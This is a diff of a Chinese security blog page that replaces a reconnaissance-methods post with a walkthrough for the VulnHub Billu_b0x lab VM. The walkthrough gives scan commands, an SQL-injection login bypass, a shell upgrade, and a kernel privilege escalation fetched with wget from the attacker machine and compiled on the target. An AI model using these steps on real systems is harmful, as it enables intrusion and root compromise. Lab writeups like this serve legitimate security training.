@@ -4,16 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="渗透测试-信息搜集, 沉梦昂志">
-    <meta name="description" content="信息搜集信息搜集的作用
-了解组织安全架构
-缩小攻击范围
-描绘网络拓扑
-建立脆弱点数据库
-
-信息搜集的分类
-主动信息搜集：与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息。
-被动信息搜集：不与目标主机进行直接交互，通过搜索">
+    <meta name="keywords" content="Billu_b0x靶机渗透, 沉梦昂志">
+    <meta name="description" content="Billu_b0x靶机渗透下载链接https://download.vulnhub.com/billu/Billu_b0x.zip
+说明攻击机为kali linux ip 为 192.168.12.145靶机 ip 192.168.12.1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>渗透测试-信息搜集 | 沉梦昂志</title>
+    <title>Billu_b0x靶机渗透 | 沉梦昂志</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://mail.ding0x0.top/font-awesome.min.css">
@@ -211,7 +204,7 @@
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        渗透测试-信息搜集
+                        Billu_b0x靶机渗透
                     </div>
                 </div>
             </div>
@@ -322,8 +315,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/笔记/" target="_blank">
-                                <span class="chip bg-color">笔记</span>
+                            <a href="/tags/渗透测试/" target="_blank">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/writeup/" target="_blank">
+                                <span class="chip bg-color">writeup</span>
                             </a>
                         
                     </div>
@@ -334,8 +331,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/总结/" class="post-category" target="_blank">
-                                总结
+                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -346,21 +343,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-07-19
+                    2019-07-14
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.1k
+                        815
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        3 分
                     </div>
                     
                 
@@ -376,155 +373,49 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="信息搜集的作用"><a href="#信息搜集的作用" class="headerlink" title="信息搜集的作用"></a>信息搜集的作用</h2><ol>
-<li>了解组织安全架构</li>
-<li>缩小攻击范围</li>
-<li>描绘网络拓扑</li>
-<li>建立脆弱点数据库</li>
-</ol>
-<h2 id="信息搜集的分类"><a href="#信息搜集的分类" class="headerlink" title="信息搜集的分类"></a>信息搜集的分类</h2><ol>
-<li>主动信息搜集：与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息。</li>
-<li>被动信息搜集：不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息。</li>
-</ol>
-<h2 id="服务器信息搜集"><a href="#服务器信息搜集" class="headerlink" title="服务器信息搜集"></a>服务器信息搜集</h2><ul>
-<li><p>whois查询</p>
-<ul>
-<li>域名详细信息</li>
-<li>域名服务器信息</li>
-<li>网络ip地址</li>
-<li>域名创建，过期时间</li>
-<li>最近更新记录</li>
-<li>可通过注册邮箱、注册人等反查相关目标注册过的域名。</li>
-<li>站长之家<a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a></li>
-<li>阿里云域名信息查询<a href="https://whois.aliyun.com" target="_blank" rel="noopener">https://whois.aliyun.com</a></li>
-<li>Kali whois命令</li>
-<li>Python-whois模块查询域名信息</li>
-</ul>
-</li>
-<li><p>企业信息搜集</p>
-<ul>
-<li>企业基本信息。</li>
-<li>员工信息（手机号码、邮箱、姓名等），组织框架、企业法人、企业综合信息等。</li>
-<li>其中员工信息收集是信息收集中的一项重要工作，员工信息包括：员工姓名、员工工号、员工家庭及交际信息、上网习惯等。（社会工程学）</li>
-<li>员工身份信息：员工简历，员工身份证，手机号，生日，家乡，住址等个人信息。5、员工社交账号信息：QQ号，QQ群，微博，微信，支付宝，员工邮箱账号等。</li>
-</ul>
-</li>
-<li><p>企业信息查询网站：</p>
-<ul>
-<li><a href="https://www.tianyancha.com天眼查" target="_blank" rel="noopener">https://www.tianyancha.com天眼查</a></li>
-<li><a href="https://www.qichacha.com/企查查" target="_blank" rel="noopener">https://www.qichacha.com/企查查</a></li>
-<li><a href="http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action#ICP备案查询" target="_blank" rel="noopener">http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action#ICP备案查询</a></li>
-<li><a href="http://www.beian.gov.cn/portal/recordQuery公安部备案查询" target="_blank" rel="noopener">http://www.beian.gov.cn/portal/recordQuery公安部备案查询</a></li>
-</ul>
-</li>
-<li><p>信息深入挖掘</p>
-<ul>
-<li>天眼查服务器搜集</li>
-<li>GitHub信息（泄露源码，泄露数据库，邮箱，ftp，ssh，3389账号）</li>
-<li>SVN信息</li>
-<li>开放端口检测</li>
-<li>cms指纹识别</li>
-</ul>
-</li>
-<li><p>邮箱信息搜集</p>
-<ul>
-<li>常见的在线邮箱收集网站，这些网站通过爬虫，搜索引擎等方式，获取互联网上暴露的邮箱地址。</li>
-<li><a href="http://www.skymem.info/" target="_blank" rel="noopener">http://www.skymem.info/</a></li>
-<li><a href="https://hunter.io/" target="_blank" rel="noopener">https://hunter.io/</a></li>
-<li><a href="https://email-format.com/" target="_blank" rel="noopener">https://email-format.com/</a></li>
-</ul>
-</li>
-<li><p>搜索引擎查询</p>
-<ul>
-<li>Google、baidu、Bing等传统搜索引擎</li>
-<li>site:baidu.com inurl:baidu.com</li>
-<li>搜target.com|公司名字</li>
-</ul>
-</li>
-<li><p>子域名枚举</p>
-<ul>
-<li>子域名枚举是为一个或多个域查找子域的过程，它是信息收集阶段的重要组成部分。</li>
-<li>子域名探测可以帮我们发现渗透测试中更多的服务，它们在安全评估的范围内，从而增加了发现漏洞的机会。</li>
-<li>查找一些用户上较少，被人遗忘的子域名，其上运行的应用程序可能会使我们发现关键漏洞。3.通常，同一组织的不同域名/应用程序中存在相同的漏洞。</li>
-</ul>
-</li>
-<li><p>子域名搜集小工具</p>
-<ul>
-<li>subDomainsBrute <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></li>
-<li>wydomain <a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></li>
-<li>wafw00f <a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></li>
-<li>WhatWeb <a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></li>
-<li>dirsearch <a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></li>
-<li>layer子域名挖掘机</li>
-<li>DNSdumpster</li>
-<li>Sublist3r <a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li>
-</ul>
-</li>
-<li><p>web应用指纹信息</p>
-<ul>
-<li>网站架构<ul>
-<li>中间件</li>
-<li>开发语言</li>
-<li>操作系统类型</li>
-<li>数据库类型</li>
-</ul>
-</li>
-<li>web应用指纹信息<ul>
-<li>潮汐指纹：<a href="http://finger.tidesec.net" target="_blank" rel="noopener">http://finger.tidesec.net</a></li>
-<li>云悉 <a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></li>
-<li>wappalyzer chrome插件</li>
-<li>kali whatweb</li>
-<li>cms识别工具 <a href="http://whatweb.bugscaner.com/look" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look</a></li>
-<li>御剑</li>
-</ul>
-</li>
-<li>敏感信息，目录信息<ul>
-<li>robots.txt</li>
-<li>crossdomin.xml</li>
-<li>sitemap.xml</li>
-<li>后台目录</li>
-<li>网站安装包</li>
-<li>网站上传目录</li>
-<li>mysql管理页面</li>
-<li>phpinfo</li>
-<li>网站富文本编辑器</li>
-<li>测试文件</li>
-<li>备份文件(.rar、.zip、.7z、.rar.gz、.bak)，(<a href="http://www.zip、root.zip、web.zip" target="_blank" rel="noopener">www.zip、root.zip、web.zip</a>)</li>
-<li>DS_Store文件</li>
-<li>vim缓存文件(.swp、.swo、.swn)</li>
-<li>web-inf/web.xml文件</li>
-</ul>
-</li>
-<li>cms、通用性信息<ul>
-<li>cms类型</li>
-<li>display:none 中的版权信息</li>
-<li>页面底部版权信息，关键字© Powered by等</li>
-<li>注释掉的html代码</li>
-<li>http头中的X-Poweered-By中的值</li>
-<li>cookie中的关键字</li>
-<li>robots.txt中的关键字</li>
-<li>404报错页面</li>
-</ul>
-</li>
-<li>旁站查询<ul>
-<li>旁站是和目标网站在同一台服务器上的其它的网站，主站无法获取权限的情况下，旁站便可以作为攻击入口。</li>
-<li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li>
-<li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></li>
-<li><a href="https://www.aizhan.com/" target="_blank" rel="noopener">https://www.aizhan.com/</a> IP反查域名</li>
-<li><a href="http://www.webscan.cc" target="_blank" rel="noopener">http://www.webscan.cc</a></li>
-</ul>
-</li>
-<li>C段信息<ul>
-<li><a href="http://www.webscan.cc" target="_blank" rel="noopener">http://www.webscan.cc</a></li>
-<li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></li>
-<li><a href="https://www.chinabaiker.com/cduan.php" target="_blank" rel="noopener">https://www.chinabaiker.com/cduan.php</a></li>
-<li>Nmap扫描C段</li>
-<li>菜刀扫描C段</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
+                <h1 id="Billu-b0x靶机渗透"><a href="#Billu-b0x靶机渗透" class="headerlink" title="Billu_b0x靶机渗透"></a>Billu_b0x靶机渗透</h1><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://download.vulnhub.com/billu/Billu_b0x.zip" target="_blank" rel="noopener">https://download.vulnhub.com/billu/Billu_b0x.zip</a></p>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>攻击机为<code>kali linux</code> ip 为 <code>192.168.12.145</code><br>靶机 ip <code>192.168.12.165</code></p>
+<h2 id="主机发现和信息搜集"><a href="#主机发现和信息搜集" class="headerlink" title="主机发现和信息搜集"></a>主机发现和信息搜集</h2><p>主机发现</p>
+<pre><code>netdiscover -r 192.168.12.0/24</code></pre><p>发现靶机ip为 <code>192.168.12.165</code></p>
+<p>端口扫描</p>
+<pre><code>nmap -sS -A -Pn -p- -n 192.168.12.165</code></pre><p>发现开放了 22 80端口</p>
+<p>直接用<code>dirb</code>区探测目录</p>
+<pre><code>dirb http://192.168.12.165 /usr/share/wordlists/dirb/big.txt</code></pre><p><img src="https://mail.ding0x0.top/blog/bj/bj_1_1.png" alt="bj_1_1"><br>说下目录利用</p>
+<pre><code>192.168.12.165/index #登录页，说是存在sql注入
+192.168.12.165/in #phpinfo 可以得到网站绝对路径
+192.168.12.165/test #任意文件下载
+192.168.12.165/panel #需要登陆
+192.168.12.165/c #得到mysql配置文件
+192.168.12.165/phpmy/ #phpmyadmin</code></pre><p>可以从<code>c</code>中得到<code>mysql</code>配置，登陆phpmyadmin，在<code>phpinfo</code>找到绝对路径，写入一句话，尝试后失败<br>但是得到了登陆张号和密码可以拿去登陆。</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>通过任意文件下载拿到首页源码，构造万能密码登陆。</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'un'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$pass</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ps'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$run</span><span class="token operator">=</span><span class="token string">'select * from auth where  pass=\''</span><span class="token punctuation">.</span><span class="token variable">$pass</span><span class="token punctuation">.</span><span class="token string">'\' and uname=\''</span><span class="token punctuation">.</span><span class="token variable">$uname</span><span class="token punctuation">.</span><span class="token string">'\''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token comment" spellcheck="true">//login</span>
+<span class="token punctuation">}</span></code></pre>
+<p>写完后看了很多东西，说是过滤了<code>\&#39;</code>,这东西不是转义符么？实际上的sql语句不应该是这样的么</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$run</span> <span class="token operator">=</span> <span class="token string">"select * from auth where pass = '$pass' and uname = '$uname'"</span><span class="token punctuation">;</span></code></pre>
+<p>然后会把所有的<code>&#39;</code>替换成空，那么构造的万能密码应该是这个意思</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$run</span> <span class="token operator">=</span> <span class="token string">"select * from auth where pass = '-\' and uname = 'or 1=1-- '"</span><span class="token punctuation">;</span></code></pre>
+<p>我的理解是<strong>用\把pass的第二个单引号给转义，所以pass现在是<code>-\&#39; and uname =</code>这一整串，然后跟上or 1=1</strong>构造成万能密码。<br>顺便提下，在sql命令行里查询想要转义<code>&#39;</code>需要用两个<code>\</code>，也是问了别人，以前都没注意过，也没出现过这种情况。<br>然后需要注意的一点是注释符<code>--</code>和被<strong>注释的</strong>的字符中间要有一个空格，或者直接用<code>#</code>。<br>以上仅是个人理解，如果有误，望斧正</p>
+<p>接着登陆后存在一个文件上传和包含，这里很好审出来就不写了，直接跳到反弹回shell。</p>
+<p>拿到后用python返回一个交互shell</p>
+<pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'__import__("pty").spawn("/bin/bash")'</span></code></pre>
+<p>查看版本信息</p>
+<pre class=" language-sh"><code class="language-sh">uname -a#Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</code></pre>
+<p>直接在kali中搜索本地提交脚本</p>
+<pre class=" language-sh"><code class="language-sh">searchsploit linux 3.13.0 | grep local</code></pre>
+<p>cp一份到/tmp目录，打开一个服务器</p>
+<pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>m SimpleHTTPServer <span class="token number">8000</span></code></pre>
+<p>在靶机中cd到/tmp目录下载脚本</p>
+<pre class=" language-sh"><code class="language-sh">wget http://192.168.12.145:8000/37292.c</code></pre>
+<p>用gcc编译</p>
+<pre class=" language-sh"><code class="language-sh">gcc 373292.c -o pwn</code></pre>
+<p>直接执行提权成功。</p>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>在phpmyadmin目录下一般存放这服务器的配置文件，<code>config.inc.php</code>，尝试访问，确实存在，直接下载，得到root账号密码，ssh登陆。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>开始sql注入没能够理解，看了很多篇，试了很多次，都没成功，小细节上就是 <code>--</code>后要有一个空格，其实这种方法在实验吧有一题出现过，后来遇到的少了就没注意过，这是一点，然后是要多关注服务器的配置文件，可能包含很多有用的信息。</p>
 
             </div>
             <hr/>
@@ -683,9 +574,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《渗透测试-信息搜集》
+                    《Billu_b0x靶机渗透》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/19/shen-tou-ce-shi-xin-xi-sou-ji/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/14/billu-b0x-ba-ji-shen-tou/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ding
             </a> 采用
@@ -725,30 +616,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/07/19/shen-tou-ce-shi-xin-xi-sou-ji/">
+                <a href="/2019/07/15/php-fan-xu-lie-hua/">
                     <div class="card-image">
                         
                         
-                        <img src="https://mail.ding0x0.top/pic_4.jpg" class="responsive-img" alt="渗透测试-信息搜集">
+                        <img src="https://mail.ding0x0.top/pic_3.jpg" class="responsive-img" alt="PHP反序列化">
                         
-                        <span class="card-title">渗透测试-信息搜集</span>
+                        <span class="card-title">PHP反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            渗透测试-信息搜集
+                            PHP反序列化入门
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-19
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-15
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -761,7 +651,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -780,24 +669,24 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/17/windows-ti-quan-ji-chu/">
+                <a href="/2019/07/12/ssh/">
                     <div class="card-image">
                         
                         
-                        <img src="https://mail.ding0x0.top/pic_5.jpg" class="responsive-img" alt="windows提权基础">
+                        <img src="https://mail.ding0x0.top/pic_4.jpg" class="responsive-img" alt="Linux ssh">
                         
-                        <span class="card-title">windows提权基础</span>
+                        <span class="card-title">Linux ssh</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            windows提权基础
+                            Linux下ssh使用的一点总结
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-17
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-12
                             </span>
                         <span class="publish-author">
                             
@@ -814,8 +703,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/笔记/" target="_blank">
-                        <span class="chip bg-color">笔记</span>
+                    <a href="/tags/Linux/" target="_blank">
+                        <span class="chip bg-color">Linux</span>
                     </a>
                     
                 </div>
